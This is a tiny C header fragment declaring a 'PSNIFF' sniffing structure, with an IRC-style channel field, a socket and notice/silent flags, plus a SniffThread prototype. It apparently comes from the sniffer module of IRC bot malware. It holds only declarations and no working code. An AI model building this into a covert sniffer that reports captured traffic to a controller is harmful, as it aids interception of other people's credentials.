#ifndef NO_PSNIFF
// sniffing structure
typedef struct PSNIFF
{
	char chan[128];
	SOCKET sock;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PSNIFF;

DWORD WINAPI SniffThread(LPVOID param);
#endif
